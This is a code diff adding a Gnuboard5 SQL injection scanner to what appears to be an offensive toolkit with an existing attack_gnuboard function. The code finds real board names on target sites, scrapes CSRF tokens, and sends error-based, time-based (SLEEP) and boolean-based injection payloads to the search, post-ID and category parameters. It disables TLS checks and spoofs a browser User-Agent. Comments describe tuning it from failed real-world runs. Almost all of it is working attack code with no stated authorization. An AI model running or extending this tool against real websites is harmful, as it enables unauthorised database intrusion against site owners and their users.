@@ -835,3 +835,563 @@ def attack_gnuboard(target_url: str, creds: list[tuple] | None = None) -> dict:
 def check_gnuboard(target_url: str) -> GnuboardFingerprint:
     """Gnuboard5 핑거프린팅만"""
     return GnuboardFingerprinter(target_url).fingerprint()
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# bo_table 자동 발견 (실전 학습: bingo 실패 사례 분석으로 추가)
+# ─────────────────────────────────────────────────────────────────────────────
+
+# 한국 사이트에서 자주 쓰이는 그누보드 게시판 이름
+COMMON_BO_TABLES = [
+    "free", "notice", "faq", "qa", "gallery", "data",
+    "board", "news", "event", "review", "qna", "pds",
+    "blog", "photo", "movie", "community", "introduce",
+    "info", "help", "support", "main", "sub",
+    "loan", "counsel", "apply", "consult", "service",
+    "intro", "about", "company", "product",
+]
+
+
+class GnuboardBotableDiscovery:
+    """
+    그누보드 bo_table 자동 발견.
+
+    실전 교훈 (기록.md 분석):
+    - bingo가 'free', 'notice' 등 추측한 bo_table은 존재하지 않아
+      모든 SQLi 테스트가 "존재하지 않는 게시판입니다" 오류 → 오탐으로 이어짐
+    - 해결: HTML에서 실제 bo_table 링크를 파싱하고, 존재 확인 후 사용
+
+    탐지 방법:
+      1. 메인 페이지 HTML에서 /bbs/board.php?bo_table= 링크 파싱
+      2. JS 변수에서 bo_table 값 추출
+      3. sitemap.php / robots.txt 분석
+      4. 공통 이름 목록으로 유효성 검증
+    """
+
+    # 존재하지 않는 게시판 응답 패턴 (이 패턴 = 테이블 없음)
+    NOT_FOUND_PATTERNS = [
+        "존재하지 않는 게시판",
+        "게시판이 없습니다",
+        "등록된 게시판이 아닙니다",
+        "board does not exist",
+        "invalid board",
+    ]
+
+    def __init__(self, base_url: str, timeout: int = 10):
+        self.base = base_url.rstrip("/")
+        self.timeout = timeout
+        self.session = requests.Session()
+        self.session.verify = False
+        self.session.headers.update({
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        })
+        requests.packages.urllib3.disable_warnings()
+
+    def discover(self) -> list[str]:
+        """
+        실제 존재하는 bo_table 목록 반환.
+        순서: HTML 파싱 → JS → sitemap → fallback 검증
+        """
+        found = set()
+
+        # 1. 메인 페이지 + 각 서브페이지에서 bo_table 링크 파싱
+        found.update(self._extract_from_page(self.base + "/"))
+        found.update(self._extract_from_page(self.base + "/bbs/"))
+
+        # 2. sitemap.php 분석
+        found.update(self._extract_from_sitemap())
+
+        # 3. 공통 이름 검증 (HTML에서 못 찾으면)
+        if not found:
+            found.update(self._validate_common_tables())
+
+        # 4. 각 bo_table 실제 존재 확인 (최종 필터)
+        valid = [t for t in sorted(found) if self._table_exists(t)]
+        return valid
+
+    def _extract_from_page(self, url: str) -> set[str]:
+        """페이지 HTML에서 bo_table 파라미터 추출"""
+        tables = set()
+        try:
+            r = self.session.get(url, timeout=self.timeout)
+            html = r.text
+
+            # href 링크에서 bo_table 추출
+            # /bbs/board.php?bo_table=XXX 또는 &bo_table=XXX
+            for m in re.finditer(
+                r'bo_table=([a-zA-Z0-9_\-]{2,30})',
+                html
+            ):
+                tables.add(m.group(1))
+
+            # JS 변수에서: var bo_table = 'XXX' 또는 bo_table: 'XXX'
+            for m in re.finditer(
+                r"""bo_table\s*[=:]\s*['"]([a-zA-Z0-9_\-]{2,30})['"]""",
+                html
+            ):
+                tables.add(m.group(1))
+
+            # data-bo_table 속성
+            for m in re.finditer(
+                r'data-bo.?table=["\']([a-zA-Z0-9_\-]{2,30})["\']',
+                html
+            ):
+                tables.add(m.group(1))
+
+        except Exception:
+            pass
+        return tables
+
+    def _extract_from_sitemap(self) -> set[str]:
+        """sitemap.php / sitemap.xml에서 bo_table 추출"""
+        tables = set()
+        for path in ["/sitemap.php", "/sitemap.xml", "/bbs/sitemap.php"]:
+            try:
+                r = self.session.get(self.base + path, timeout=8)
+                if r.status_code == 200:
+                    for m in re.finditer(
+                        r'bo_table=([a-zA-Z0-9_\-]{2,30})',
+                        r.text
+                    ):
+                        tables.add(m.group(1))
+            except Exception:
+                continue
+        return tables
+
+    def _validate_common_tables(self) -> set[str]:
+        """공통 bo_table 이름 목록 중 존재하는 것만 반환"""
+        valid = set()
+        for name in COMMON_BO_TABLES:
+            if self._table_exists(name):
+                valid.add(name)
+                if len(valid) >= 5:  # 너무 많이 요청하지 않도록 제한
+                    break
+        return valid
+
+    def _table_exists(self, bo_table: str) -> bool:
+        """
+        bo_table이 실제 존재하는지 확인.
+
+        핵심: "존재하지 않는 게시판입니다" 응답이면 None 반환.
+        이 확인 없이 SQLi 테스트하면 모두 오탐이 됨 (기록.md 교훈).
+        """
+        try:
+            url = f"{self.base}/bbs/board.php?bo_table={bo_table}"
+            r = self.session.get(url, timeout=8, allow_redirects=True)
+            body = r.text
+
+            # 존재하지 않는 게시판 패턴이면 False
+            for pat in self.NOT_FOUND_PATTERNS:
+                if pat in body:
+                    return False
+
+            # HTTP 200 + 실제 게시판 콘텐츠 (글 목록, 제목 등)
+            board_indicators = [
+                "게시물", "글쓰기", "list-board", "board-list",
+                "wr_id", "bo_table", "g5-board",
+                "subject", "writer", "datetime",
+            ]
+            if r.status_code == 200 and any(kw in body for kw in board_indicators):
+                return True
+
+        except Exception:
+            pass
+        return False
+
+    def get_board_form_fields(self, bo_table: str) -> dict:
+        """
+        게시판 글쓰기 폼의 모든 hidden 필드 추출 (CSRF 토큰 포함).
+
+        실전 교훈: POST 요청에 hidden 필드 누락 시 CSRF 오류 발생.
+        """
+        fields = {}
+        try:
+            url = f"{self.base}/bbs/write.php?bo_table={bo_table}"
+            r = self.session.get(url, timeout=10)
+            if r.status_code != 200:
+                return fields
+
+            html = r.text
+            # hidden input 추출
+            for m in re.finditer(
+                r"""<input[^>]+type=["']?hidden["']?[^>]*>""",
+                html, re.I
+            ):
+                tag = m.group(0)
+                name = re.search(r"""name=["']([^"']+)["']""", tag)
+                value = re.search(r"""value=["']([^"']*)["']""", tag)
+                if name:
+                    fields[name.group(1)] = value.group(1) if value else ""
+
+            # bo_table 필드 자동 추가
+            fields.setdefault("bo_table", bo_table)
+
+        except Exception:
+            pass
+        return fields
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# 그누보드 전용 SQLi 스캐너 (실전 학습 버전)
+# ─────────────────────────────────────────────────────────────────────────────
+
+class GnuboardSqliScanner:
+    """
+    그누보드5 전용 SQLi 스캐너.
+
+    실전 교훈 (기록.md 분석):
+    1. bo_table 없는 URL에서 SQLi 테스트 → 항상 "존재하지 않는 게시판" → 오탐
+    2. GnuBoard 오류 페이지(HTTP 200 + 오류 텍스트)를 SQLi 오류로 오해
+    3. 단일 시간 측정으로 time-based 판정 → 네트워크 지연으로 오탐
+    4. CSRF 토큰 누락으로 POST 요청 모두 실패
+
+    테스트 대상 파라미터 (우선순위순):
+      - /bbs/board.php?bo_table=XXX&stx=  (검색어 → 가장 자주 취약)
+      - /bbs/board.php?bo_table=XXX&page= (페이지 번호)
+      - /bbs/view.php?bo_table=XXX&wr_id= (글 번호)
+      - /bbs/search.php?stx=             (사이트 전체 검색)
+      - 회원 관련: /bbs/login.php mb_id 필드
+    """
+
+    # 실제 SQL 에러 패턴 (GnuBoard 일반 오류와 구별)
+    REAL_SQL_ERRORS = [
+        r"you have an error in your sql syntax",
+        r"1064 .*sql syntax",
+        r"mysql_fetch_array.*expects",
+        r"ORA-\d{5}:",
+        r"pg_query\(\).*error",
+        r"unclosed quotation mark",
+        r"column count doesn.t match value count",
+        r"extractvalue\(1,",       # extractvalue 에러 리플렉션
+        r"~[^~]{1,50}~",           # ~ 사이 데이터 추출 성공 패턴
+        r"XPATH syntax error",
+    ]
+
+    # GnuBoard 일반 오류 (SQLi 아님 — 이것에 속으면 오탐)
+    GNUBOARD_NORMAL_ERRORS = [
+        "존재하지 않는 게시판",
+        "게시물이 없습니다",
+        "잘못된 접근",
+        "정상적인 접근이 아닙니다",
+        "접근 권한이 없습니다",
+        "로그인 후 이용하세요",
+        "올바른 경로로",
+    ]
+
+    def __init__(self, base_url: str, timeout: int = 10):
+        self.base = base_url.rstrip("/")
+        self.timeout = timeout
+        self.session = requests.Session()
+        self.session.verify = False
+        self.session.headers.update({
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        })
+        requests.packages.urllib3.disable_warnings()
+        self.results: list[dict] = []
+
+    def _is_real_sql_error(self, body: str) -> str:
+        """실제 SQL 에러인지 판별. GnuBoard 기본 오류 페이지는 제외."""
+        body_lower = body.lower()
+
+        # 먼저 그누보드 일반 오류 페이지인지 확인
+        for normal_err in self.GNUBOARD_NORMAL_ERRORS:
+            if normal_err in body:
+                return ""  # 일반 오류 → SQLi 아님
+
+        # 실제 SQL 에러 패턴 확인
+        for pat in self.REAL_SQL_ERRORS:
+            m = re.search(pat, body, re.I)
+            if m:
+                return m.group(0)[:120]
+        return ""
+
+    def _baseline_response(self, url: str) -> tuple[int, int, str]:
+        """
+        정상 응답 기준선 획득.
+        반환: (status_code, content_length, snippet)
+        """
+        try:
+            r = self.session.get(url, timeout=self.timeout)
+            return r.status_code, len(r.text), r.text[:200]
+        except Exception:
+            return 0, 0, ""
+
+    def _time_based_confirm(self, url: str, n: int = 3) -> tuple[float, float]:
+        """
+        시간기반 주입 3회 측정으로 신뢰도 향상.
+
+        실전 교훈: 1회 측정은 네트워크 지연으로 오탐 가능.
+        3회 중 2회 이상 3초 이상 지연 시 취약점으로 판정.
+        반환: (측정값들의 중앙값, 기준 응답시간)
+        """
+        times = []
+        for _ in range(n):
+            t0 = time.time()
+            try:
+                self.session.get(url, timeout=15)
+            except Exception:
+                pass
+            times.append(time.time() - t0)
+            time.sleep(0.5)
+
+        times.sort()
+        median = times[len(times) // 2]
+        return median, times[0]  # (중앙값, 최솟값)
+
+    def scan_board(self, bo_table: str) -> list[dict]:
+        """
+        실제 존재하는 bo_table에 대해 SQLi 스캔.
+
+        중요: GnuboardBotableDiscovery.discover()로 확인된 bo_table만 입력.
+        """
+        board_url = f"{self.base}/bbs/board.php?bo_table={bo_table}"
+        results = []
+
+        # 1. 검색어 파라미터 (stx) — 가장 자주 취약
+        results.extend(self._test_stx(bo_table))
+
+        # 2. 글 번호 파라미터 (wr_id)
+        results.extend(self._test_wr_id(bo_table))
+
+        # 3. 검색 옵션 파라미터
+        results.extend(self._test_sca(bo_table))
+
+        return results
+
+    def _test_stx(self, bo_table: str) -> list[dict]:
+        """stx (검색어) 파라미터 SQLi 테스트"""
+        results = []
+        base_url = f"{self.base}/bbs/board.php?bo_table={bo_table}&act=search&stx="
+        base_status, base_len, base_snippet = self._baseline_response(
+            base_url + "test"
+        )
+        if base_status == 0:
+            return results
+
+        # Error-based
+        for payload in ["'", '"', "' OR '1'='1", "' AND '1'='2"]:
+            import urllib.parse
+            url = base_url + urllib.parse.quote(payload)
+            try:
+                r = self.session.get(url, timeout=self.timeout)
+                evidence = self._is_real_sql_error(r.text)
+                if evidence:
+                    results.append({
+                        "type": "error_based",
+                        "param": "stx",
+                        "url": url,
+                        "payload": payload,
+                        "evidence": evidence,
+                        "confidence": "high",
+                    })
+                    return results  # 확인됨, 더 이상 테스트 불필요
+            except Exception:
+                continue
+
+        # Time-based (3회 확인)
+        import urllib.parse
+        sleep_payload = "' AND SLEEP(3)-- -"
+        sleep_url = base_url + urllib.parse.quote(sleep_payload)
+        median_t, min_t = self._time_based_confirm(sleep_url, n=3)
+        if median_t >= 2.8:
+            results.append({
+                "type": "time_based",
+                "param": "stx",
+                "url": sleep_url,
+                "payload": sleep_payload,
+                "evidence": f"3회 측정 중앙값: {median_t:.1f}s (기준: {min_t:.1f}s)",
+                "confidence": "high" if median_t >= 3.5 else "medium",
+            })
+
+        # Boolean-based (응답 크기 비교)
+        import urllib.parse
+        true_url = base_url + urllib.parse.quote("test' AND '1'='1")
+        false_url = base_url + urllib.parse.quote("test' AND '1'='2")
+        try:
+            r_true = self.session.get(true_url, timeout=self.timeout)
+            r_false = self.session.get(false_url, timeout=self.timeout)
+            # 크기 차이 > 50바이트 AND 정상 응답 대비 명확한 차이
+            diff = abs(len(r_true.text) - len(r_false.text))
+            if diff > 50 and r_true.status_code == r_false.status_code:
+                # 추가 확인: 두 결과가 모두 "게시판 오류"가 아니어야 함
+                if not any(e in r_true.text for e in self.GNUBOARD_NORMAL_ERRORS):
+                    results.append({
+                        "type": "boolean_based",
+                        "param": "stx",
+                        "url": true_url,
+                        "payload": "test' AND '1'='1 vs AND '1'='2",
+                        "evidence": f"True: {len(r_true.text)}B vs False: {len(r_false.text)}B (차이: {diff}B)",
+                        "confidence": "medium",
+                    })
+        except Exception:
+            pass
+
+        return results
+
+    def _test_wr_id(self, bo_table: str) -> list[dict]:
+        """wr_id (글 번호) 파라미터 SQLi 테스트"""
+        results = []
+        # 먼저 유효한 wr_id 찾기 (1~5 시도)
+        valid_wr_id = None
+        for wid in range(1, 6):
+            url = f"{self.base}/bbs/view.php?bo_table={bo_table}&wr_id={wid}"
+            try:
+                r = self.session.get(url, timeout=8)
+                if r.status_code == 200 and "wr_id" in r.text:
+                    valid_wr_id = wid
+                    break
+            except Exception:
+                continue
+
+        if valid_wr_id is None:
+            return results
+
+        base_url = f"{self.base}/bbs/view.php?bo_table={bo_table}&wr_id="
+        import urllib.parse
+
+        # Error-based
+        for payload in [f"{valid_wr_id}'", f"{valid_wr_id}' AND '1'='1"]:
+            url = base_url + urllib.parse.quote(payload)
+            try:
+                r = self.session.get(url, timeout=self.timeout)
+                evidence = self._is_real_sql_error(r.text)
+                if evidence:
+                    results.append({
+                        "type": "error_based",
+                        "param": "wr_id",
+                        "url": url,
+                        "payload": payload,
+                        "evidence": evidence,
+                        "confidence": "high",
+                    })
+                    return results
+            except Exception:
+                continue
+
+        return results
+
+    def _test_sca(self, bo_table: str) -> list[dict]:
+        """sca (카테고리) 파라미터 SQLi 테스트"""
+        results = []
+        import urllib.parse
+
+        # sca는 상대적으로 드문 취약점이므로 error-based만 시도
+        for payload in ["'", "' OR '1'='1"]:
+            url = f"{self.base}/bbs/board.php?bo_table={bo_table}&sca={urllib.parse.quote(payload)}"
+            try:
+                r = self.session.get(url, timeout=self.timeout)
+                evidence = self._is_real_sql_error(r.text)
+                if evidence:
+                    results.append({
+                        "type": "error_based",
+                        "param": "sca",
+                        "url": url,
+                        "payload": payload,
+                        "evidence": evidence,
+                        "confidence": "high",
+                    })
+                    return results
+            except Exception:
+                continue
+
+        return results
+
+    def scan_site_search(self) -> list[dict]:
+        """사이트 전체 검색 엔드포인트 SQLi 테스트"""
+        results = []
+        import urllib.parse
+
+        # 그누보드 전체 검색 URL
+        search_urls = [
+            f"{self.base}/bbs/search.php?stx=",
+            f"{self.base}/search.php?stx=",
+            f"{self.base}/bbs/search.php?sfl=wr_subject&stx=",
+        ]
+
+        for base_url in search_urls:
+            try:
+                r_check = self.session.get(base_url + "test", timeout=8)
+                if r_check.status_code != 200:
+                    continue
+            except Exception:
+                continue
+
+            for payload in ["'", "' OR '1'='1"]:
+                url = base_url + urllib.parse.quote(payload)
+                try:
+                    r = self.session.get(url, timeout=self.timeout)
+                    evidence = self._is_real_sql_error(r.text)
+                    if evidence:
+                        results.append({
+                            "type": "error_based",
+                            "param": "stx (global search)",
+                            "url": url,
+                            "payload": payload,
+                            "evidence": evidence,
+                            "confidence": "high",
+                        })
+                        return results
+                except Exception:
+                    continue
+
+        return results
+
+    def full_scan(self) -> dict:
+        """
+        그누보드 전체 SQLi 스캔 워크플로우.
+
+        순서:
+          1. bo_table 자동 발견 (실제 존재 확인)
+          2. 각 게시판 stx/wr_id/sca 파라미터 테스트
+          3. 사이트 전체 검색 테스트
+        """
+        discovery = GnuboardBotableDiscovery(self.base, self.timeout)
+
+        report = {
+            "target": self.base,
+            "bo_tables_found": [],
+            "bo_tables_tested": [],
+            "vulnerabilities": [],
+            "summary": "",
+        }
+
+        # 1. 실제 존재하는 bo_table 발견
+        valid_tables = discovery.discover()
+        report["bo_tables_found"] = valid_tables
+
+        if not valid_tables:
+            report["summary"] = "bo_table 미발견 — 전체 검색만 테스트"
+            # 사이트 전체 검색 SQLi
+            site_results = self.scan_site_search()
+            report["vulnerabilities"].extend(site_results)
+            return report
+
+        # 2. 각 게시판 테스트 (최대 3개)
+        for table in valid_tables[:3]:
+            report["bo_tables_tested"].append(table)
+            vulns = self.scan_board(table)
+            report["vulnerabilities"].extend(vulns)
+
+        # 3. 사이트 전체 검색
+        site_results = self.scan_site_search()
+        report["vulnerabilities"].extend(site_results)
+
+        # 요약
+        n = len(report["vulnerabilities"])
+        if n > 0:
+            types = list(set(v["type"] for v in report["vulnerabilities"]))
+            report["summary"] = f"취약점 {n}개 발견: {', '.join(types)}"
+        else:
+            report["summary"] = "SQLi 미발견"
+
+        return report
+
+
+def scan_gnuboard_sqli(target_url: str) -> dict:
+    """그누보드 SQLi 전체 스캔 원라이너"""
+    return GnuboardSqliScanner(target_url).full_scan()
+
+
+def discover_bo_tables(target_url: str) -> list[str]:
+    """그누보드 bo_table 목록만 발견"""
+    return GnuboardBotableDiscovery(target_url).discover()
